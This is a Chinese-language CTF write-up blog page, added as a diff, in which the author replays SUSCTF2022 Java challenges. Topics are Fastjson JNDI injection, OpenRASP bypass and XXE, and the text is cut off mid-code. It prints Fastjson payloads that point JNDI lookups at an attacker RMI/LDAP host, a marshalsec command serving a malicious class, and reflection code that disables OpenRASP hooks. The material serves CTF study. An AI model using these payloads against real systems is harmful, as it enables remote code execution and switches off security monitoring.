@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SUSCTF2022 java复现为什么我是SUSCTF的出题人加运维还要复现自己的比赛的java呢？因为我是垃圾，不会java，现在开始学（其实是某天晚上想去打D3然后发现已经开赛一小时不能注册然后没事做了）但是出题人说并不想公布环境，所以。我也就不好分享环境了 从运维的角度讲一下这次比赛这两个题反复revenge的情况和出题人的预期解吧 baby gadget1 &amp; revengejd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUSCTF2022 java复现">
+<meta property="og:url" content="https://blog.z3ratu1.cn/SUSCTF2022%20java%E5%A4%8D%E7%8E%B0.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="SUSCTF2022 java复现为什么我是SUSCTF的出题人加运维还要复现自己的比赛的java呢？因为我是垃圾，不会java，现在开始学（其实是某天晚上想去打D3然后发现已经开赛一小时不能注册然后没事做了）但是出题人说并不想公布环境，所以。我也就不好分享环境了 从运维的角度讲一下这次比赛这两个题反复revenge的情况和出题人的预期解吧 baby gadget1 &amp; revengejd">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-03-04T09:24:29.000Z">
+<meta property="article:modified_time" content="2022-03-09T09:09:54.953Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/SUSCTF2022%20java%E5%A4%8D%E7%8E%B0.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>SUSCTF2022 java复现 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/SUSCTF2022%20java%E5%A4%8D%E7%8E%B0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SUSCTF2022 java复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-04 17:24:29" itemprop="dateCreated datePublished" datetime="2022-03-04T17:24:29+08:00">2022-03-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-09 17:09:54" itemprop="dateModified" datetime="2022-03-09T17:09:54+08:00">2022-03-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/SUSCTF2022%20java%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="SUSCTF2022 java复现" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/SUSCTF2022%20java%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/SUSCTF2022%20java%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SUSCTF2022-java复现"><a href="#SUSCTF2022-java复现" class="headerlink" title="SUSCTF2022 java复现"></a>SUSCTF2022 java复现</h1><p>为什么我是SUSCTF的出题人加运维还要复现自己的比赛的java呢？<br>因为我是垃圾，不会java，现在开始学（其实是某天晚上想去打D3然后发现已经开赛一小时不能注册然后没事做了）<br>但是出题人说并不想公布环境，所以。我也就不好分享环境了</p>
+<p>从运维的角度讲一下这次比赛这两个题反复revenge的情况和出题人的预期解吧</p>
+<h2 id="baby-gadget1-amp-revenge"><a href="#baby-gadget1-amp-revenge" class="headerlink" title="baby gadget1 &amp; revenge"></a>baby gadget1 &amp; revenge</h2><p>jdk使用的版本是8u181（上帝视角。感觉做题的时候会有点猜，这个事情赛后也被师傅们吐槽了。。。。），这个版本是LDAP Reference修复的前一个版本，也就意味着JNDI注入即可rce。但是这个题配了openrasp，执行命令会被拦截（然后我再学一下openrasp的配置）</p>
+<h3 id="简单的非预期"><a href="#简单的非预期" class="headerlink" title="简单的非预期"></a>简单的非预期</h3><p>这个题在部署环境的时候把fastjson的版本搞成了1.2.46。。。但实际上给的用来提示的lib.zip里却是48。。。但是实际上的依赖确是46，导致直接用48前的通杀payload，绕过openrasp即可。</p>
+<p>但是垃圾的我在复现的时候想先换回46，然后测一下非预期，把lib.zip里的fastjson替换之后发现通杀payload打不动。。。然后才发现依赖不是在这里面的，这个完全就是个提示（我那个时候就纳闷怎么还有这种操作就能引入依赖），实际上是在tomcat的webapp的WEB-INF下的lib目录下</p>
+<p>但是我菜到连现成的LDAP Ref server都不会用。记一下<br>用的当然是经典<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code><br>先简单的写一个static处的payload类，编译出来，就叫EvilClass.class。放到http服务下，以如下命令启动</p>
+<pre class=" language-bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://vps/<span class="token comment" spellcheck="true">#EvilClass port</span>
+</code></pre>
+<p>然后LDAP连接填这个</p>
+<pre><code>ldap://vps:port/dsadads
+</code></pre>
+<p>后面那个路径填啥都无所谓，反正这个server会给你重定向到对应的类上去，就能打通了</p>
+<p>实际上就是先访问LDAP服务然后LDAP服务返回了个Reference类告诉你这个类文件在哪然后远程加载，这个过程用的应该是URLClassloader</p>
+<p><del>说起来上述原理我应该以前就懂的….</del></p>
+<p>这里用BCEL Classloader也行，因为这里的tomcat版本是8.5，jdk版本也比较老，符合BCEL存在的环境（当然仍然是上帝视角）</p>
+<p>无论用啥打法，反正发现JNDI注入能用之后其实基本上随便打了</p>
+<p>当然也一发打过去给rasp拦了</p>
+<h3 id="revenge的非预期"><a href="#revenge的非预期" class="headerlink" title="revenge的非预期"></a>revenge的非预期</h3><p>题目是只给了挖链子所需的依赖的，但实际上还有一些其他的依赖没有给出，为了实现挖出来的新链子能正常反序列化就开了autotype。然后被师傅们搜索过去的历史漏洞给硬生生fuzz出了一个没给出的可以打的依赖，又是一波JNDI注入打通</p>
+<p>当然，正常打还是会被rasp拦，和AAA的师傅聊的时候他们说他们打的时候用的python还没输出回显，根本不知道有rasp的存在，所以打半天不知道为什么打不通。。。</p>
+<p>这个就是那个没有给出但时间能打的依赖</p>
+<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.xbean.propertyeditor.JndiConverter"</span><span class="token punctuation">,</span><span class="token property">"AsText"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/aaa"</span><span class="token punctuation">}</span>
+</code></pre>
+<p>这里也可以用ldap（理论上来说8u181已经修了rmi来着）</p>
+<p>雨了个雨师傅写的fastjson版本探测和出网探测操作<br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.yulegeyu.com/2021/09/22/%E9%82%A3%E4%BA%9B%E5%B9%B4%E4%B8%80%E8%B5%B7%E6%89%93%E8%BF%87%E7%9A%84CTF-Laravel-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86Tricks%E5%88%86%E6%9E%90/">那些年一起打过的CTF-Laravel-任意用户登陆Tricks分析</a><br>这个是一个收集的比较多的fastjson payload<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/safe6Sec/Fastjson">safe6Sec&#x2F;Fastjson</a></p>
+<h3 id="openrasp绕过"><a href="#openrasp绕过" class="headerlink" title="openrasp绕过"></a>openrasp绕过</h3><p>完全不会这个东西，简单搜索教程之后感觉应该是official.js是主要规则配置文件？然后点开一看怎么全是正则。。。不应该是究极函数hook之类的操作吗。好吧，应该究极hook的时候也是用正则去判断的，好感度降低</p>
+<p>网上随便找了个文章的绕过方法<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.anquanke.com/post/id/195016">多种姿势openrasp命令执行绕过</a><br>说实话，这个反射直接把他关了可还行。。。要我说得注意一下别人打到rce之后不能随便关啊，比如至尊SELinux之类的</p>
+<pre class=" language-java"><code class="language-java">Object o <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.baidu.openrasp.HookHandler"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Field f <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"enableHook"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Field m <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"modifiers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+m<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>Modifier<span class="token punctuation">.</span>FINAL<span class="token punctuation">)</span><span class="token punctuation">;</span>
+f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">AtomicBoolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>19年的文章了现在还能用。。。并且这个关直接全局关了，用完了记得开回去，改回true就行</p>
+<p>出题人的预期绕过是用ForkAndExec，似乎是个Unix下的native方法，感觉只能反射调用，参数类型还麻烦的一比。网上复制粘贴的打过去被openrasp拦了。。。。</p>
+<p>没要到出题人的exp。。。看到有的师傅说允许发URL请求和读文件，就直接外带flag了，然后我试了一下读文件也没成功。。。是我的问题吗</p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>预期就是从给的依赖里面摸出来一个新的JNDI注入，为此题目是开了Autotype支持的。然后还上了简单的waf。我觉得能找到链子了这个waf就无所谓了其实，过滤了<code>JTANonClusteredSemaphore</code>这个类名和<code>\\x</code>，JSON还支持\uxxx这种形式，直接绕过即可<br>预期解</p>
+<pre class=" language-json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore"</span><span class="token punctuation">,</span><span class="token property">"transactionManagerJNDIName"</span><span class="token operator">:</span> <span class="token string">"rmi://192.168.0.105:1090/ldtnpi"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$[0].transaction"</span><span class="token punctuation">}</span><span class="token punctuation">]</span> 
+</code></pre>
+<p>然后在已知了预期解的情况下再反过来看看这个链子吧<br>AAA的师傅用了很骚的一招，直接把题目附件里的jar包和原版比对，得到了<code>getTransaction()</code>这个方法被修改过，从原来的protected变成了public，符合了fastjson的利用条件。就直接找到链了<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://javadoc.io/doc/org.quartz-scheduler/quartz/latest/index.html">org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore</a><br>看一下这个函数的代码，直接lookup了。这里的this.transactionManagerJNDIName虽然是private的，但是有对应的setter，也没有问题。但是想从这个茫茫类海里面找到这个玩意又谈何容易呢。想必是有自动化工具之类的东西吧</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Transaction <span class="token function">getTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> LockException <span class="token punctuation">{</span>
+        InitialContext ic <span class="token operator">=</span> null<span class="token punctuation">;</span>
+
+        Transaction var3<span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            ic <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            TransactionManager tm <span class="token operator">=</span> <span class="token punctuation">(</span>TransactionManager<span class="token punctuation">)</span>ic<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>transactionManagerJNDIName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            var3 <span class="token operator">=</span> tm<span class="token punctuation">.</span><span class="token function">getTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SystemException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LockException</span><span class="token punctuation">(</span><span class="token string">"Failed to get Transaction from TransactionManager"</span><span class="token punctuation">,</span> var12<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LockException</span><span class="token punctuation">(</span><span class="token string">"Failed to find TransactionManager in JNDI under name: "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transactionManagerJNDIName<span class="token punctuation">,</span> var13<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ic <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    ic<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> var3<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<h3 id="打一下tomcat-EL"><a href="#打一下tomcat-EL" class="headerlink" title="打一下tomcat EL"></a>打一下tomcat EL</h3><p>当然还有的师傅把这个环境认为是比较高的jdk，所以用的tomcat EL执行命令，本地复现了半天没打上去。。。。</p>
+<p>tomcat EL对tomcat的版本有一定的需求，但是tomcat8理论上来说好像没有问题。<br>这个的打法我从印象里应该是用rmi然后用本地factory的打法，如这篇文章所示（以前就看过的）<br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/">Exploitng JNDI Injection In Java</a></p>
+<p>但这个玩意本地打的通远程打不通。。。然后问了下做出来的师傅，说是用的javaSerializedData这个字段打本地链打通的。但是用的链还是tomcat EL。我直接疑惑，这个的触发点应该不是readObject吧，之前看的分析文章都是<code>getObjectInstance</code>，怎么也能塞serializedData用反序列化本地链这种打法的。。。<br>翻出来了rouge-jndi试一下。那个师傅用的是这个项目，在rouge-jndi的基础上加了些payload<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zzwlpx/JNDIExploit">JNDIExploit</a></p>
+<p>rouge-jndi本地没打通，远程倒是打通了。。。然后也被rasp拦了，那个师傅用的是加强版的内存马，没给rasp拦住</p>
+<p>暂时没能理解为什么反序列化的地方这个玩意也能打通。。。<br>rouge-jndi的作者给出的解释是<code>leads to RCE via unsafe reflection in org.apache.naming.factory.BeanFactory</code></p>
+<p>暂时学习一下吧就。。。</p>
+<p>然后还有一个奇怪的点，就是这里用的那个eval的语法，写着引擎是js，但是用的都是java代码，但又有些地方是js语法。。。比如变量是没有类型的，统一是var。。。不知道这个的时候我一开始卡了半天</p>
+<p>JNDIExploit的作者在代码注释中提到了这一点</p>
+<blockquote>
+<p>在对代码进行改写时需要注意：<br>① 所有的数据类型修改为 var, 包括 byte[] bytes ( var bytes )<br>② 必须使用全类名<br>③  System.out.println() 需要修改为 print()<br>④  try{…}catch(Exception e){…}  需要修改为 try{…}catch(err){…}<br>⑤  双引号改为单引号<br>⑥  Class.forName() 需要改为 java.lang.Class.forName(), String 需要改为 java.lang.String等<br>⑦  去除类型强转<br>⑧  不能用 sun.misc.Base64Encoder，会抛异常  javax.script.ScriptException: ReferenceError: “sun” is not defined in &lt;eval&gt; at line number 1<br>⑨  不能使用  for(Object obj : objects) 循环</p>
+</blockquote>
+<p>简单的看了一下调用栈。比较怪的是rmi本地通远程不通，ldap远程通本地不通。</p>
+<p>这是rmi的调用栈</p>
+<pre><code>org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:216)
+javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:332)
+com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
+com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
+com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
+javax.naming.InitialContext.lookup(InitialContext.java:417)
+</code></pre>
+<p>这个是ldap使用serializedData打ELProcessor的调用栈</p>
+<pre><code>org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:216)
+javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:194)
+com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1113)
+com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
+com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
+com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
+com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
+javax.naming.InitialContext.lookup(InitialContext.java:417)
+</code></pre>
+<p>这个是ldap使用打CC链的调用栈</p>
+<pre><code>com.sun.jndi.ldap.Obj.deserializeObject(Obj.java:536)
+at com.sun.jndi.ldap.Obj.decodeObject(Obj.java:242)
+com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1079)
+com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
+com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
+com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
+com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
+javax.naming.InitialContext.lookup(InitialContext.java:417)
+</code></pre>
+<p>可以看到打ELProcessor的时候触发的还是<code>getObjectInstance</code>（但为什么结果不同暂且未知），而ELProcessor和CC等反序列化链的区别出现在<code>com.sun.jndi.ldap.LdapCtx</code>中的<code>c_lookup</code>函数中，简单的看了一下就是会先反序列化<code>javaSerializedData</code>，里面塞的是反序列化链的时候直接在<code>decodeObject</code>处反序列化，而ResourceRef包装一下ELProcessor会被正常反序列化出来，之后会走到后面的getObjectInstance再触发。所以即使把ELProcessor塞到serializedData里也能成功利用</p>
+<p>（其实就是这里和rmi类似也有这么一步getObjectInstance，怎么都没看见有文章说的。。）</p>
+<h2 id="baby-gadget2-amp-revenge"><a href="#baby-gadget2-amp-revenge" class="headerlink" title="baby gadget2 &amp; revenge"></a>baby gadget2 &amp; revenge</h2><p>赛时后面太累了就没管这个题了，我还以为revenge修好了来着，怎么看大伙wp还是非预期。。。</p>
+<h3 id="XXE文件读取"><a href="#XXE文件读取" class="headerlink" title="XXE文件读取"></a>XXE文件读取</h3><p>开局登录框抓包发现是xml，打一个xxe。有简单过滤，然后用先知的那篇经典文章的payload打通，给了提示读hint.txt（当然我复现的时候直接对着源码来的，走个流程）<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/3357#toc-8">究极xxe汇总</a></p>
+<p>这里做的是简单的字符串匹配，所以还可以用之前学过的UTF16编码或者实体编码绕过</p>
+<p>虽然我看着源码知道flag的名字，但是外带的时候却外带不出来，明明hint.txt随便读，为什么flag就不行呢</p>
+<p>问了下甫舟，说是java高版本之后只能读取单行的文件，读多行文件直接报错，所以读不出来<br>直接搜资料，调试不动了<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leadroyal.cn/p/914/">9102年Java里的XXE</a><br>这个师傅id有点眼熟，然后看着他的其他乱七八糟的闲聊看了一个小时。。。。</p>
+<p>然后是访问一个zip，zip里面是究极ASM代码。。。就看字符串大概能看出来有一个路由<code>bf2dcf6664b16e0efe471b2eac2b54b2</code><br>会把输入base64decode一下然后放进<code>SafeInputStream</code>，继承了ObjectInputStream，然后还有在resolveClass里面塞了一些黑名单</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SafeInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">boolean</span> entry <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
